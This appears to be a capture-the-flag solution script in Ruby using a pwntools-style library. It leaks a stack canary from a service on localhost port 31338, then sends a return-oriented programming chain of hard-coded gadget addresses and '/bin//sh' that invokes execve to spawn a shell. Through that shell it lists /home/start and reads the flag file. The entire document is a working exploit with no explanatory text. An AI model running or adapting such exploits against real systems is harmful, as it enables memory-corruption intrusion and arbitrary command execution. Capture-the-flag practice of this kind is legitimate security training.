# encoding: ASCII-8BIT
#require 'pwn'
context.log_level = :debug
r = Sock.new '127.0.0.1', 31338
r.send "a" * 25
r.recvuntil "a" * 25
canary = "\x00" + r.recvn(7)
log.info enhex(canary)


buf = "a" * 24 + canary
buf = buf.ljust(40, 'b')
p = buf
p += p64(0x00000000004017f7) 
p += p64(0x00000000006cc080) 
p += p64(0x000000000047a6e6) 
p += '/bin//sh'
p += p64(0x4141414141414141) 
p += p64(0x4141414141414141) 
p += p64(0x0000000000475fc1) 
p += p64(0x00000000004017f7) 
p += p64(0x00000000006cc088) 
p += p64(0x000000000042732f) 
p += p64(0x0000000000475fc1) 
p += p64(0x00000000004005d5) 
p += p64(0x00000000006cc080) 
p += p64(0x00000000004017f7) 
p += p64(0x00000000006cc088) 
p += p64(0x000000000047a6e6) 
p += p64(59) 
p += p64(0x00000000006cc088) 
p += p64(0x4141414141414141) 
p += p64(0x0000000000468e75) 
r.send(p)
r.recvuntil 'a'
r.sendline('exit')
r.sendline("ls /home/start")
puts r.recvuntil('flag')
r.sendline("cat /home/start/flag")
puts r.recvuntil('}')
